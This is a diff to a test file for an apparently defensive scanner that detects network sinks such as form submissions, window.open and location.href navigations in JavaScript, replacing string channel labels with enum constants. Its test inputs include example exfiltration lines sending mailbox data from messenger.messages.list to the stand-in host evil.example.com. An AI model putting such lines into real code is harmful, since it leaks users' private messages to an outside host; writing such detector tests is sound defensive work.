@@ -6,7 +6,7 @@
 // alongside the checks that consume them.
 
 import { test } from "node:test";
-import { URL_CLASS } from "../../src/lib/enum.js";
+import { URL_CLASS, CHANNEL } from "../../src/lib/enum.js";
 import assert from "node:assert/strict";
 
 import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
@@ -107,7 +107,7 @@ test("createElement('form') + action + submit() is an overt sink to the action",
       "f.submit();"
   );
   assert.equal(hit.type, "form-submit");
-  assert.equal(hit.channel, "overt");
+  assert.equal(hit.channel, CHANNEL.OVERT);
   assert.equal(hit.destClass, URL_CLASS.REMOTE);
   assert.equal(hit.host, "cloud.example.com");
 });
@@ -179,7 +179,7 @@ test("window.open carrying a data-API call is a covert, data-bearing sink", () =
     'window.open("https://evil.example.com/?d=" + messenger.messages.list(id));'
   );
   assert.equal(hit.type, "window-open");
-  assert.equal(hit.channel, "covert");
+  assert.equal(hit.channel, CHANNEL.COVERT);
   assert.equal(hit.destClass, URL_CLASS.REMOTE);
   assert.equal(hit.carriesData, true);
 
@@ -194,7 +194,7 @@ test("a location.href navigation carrying a data-API call is covert and data-bea
     'location.href = "https://evil.example.com/?d=" + messenger.messages.list(id);'
   );
   assert.equal(hit.type, "navigation");
-  assert.equal(hit.channel, "covert");
+  assert.equal(hit.channel, CHANNEL.COVERT);
   assert.equal(hit.destClass, URL_CLASS.REMOTE);
   assert.equal(hit.carriesData, true);
 
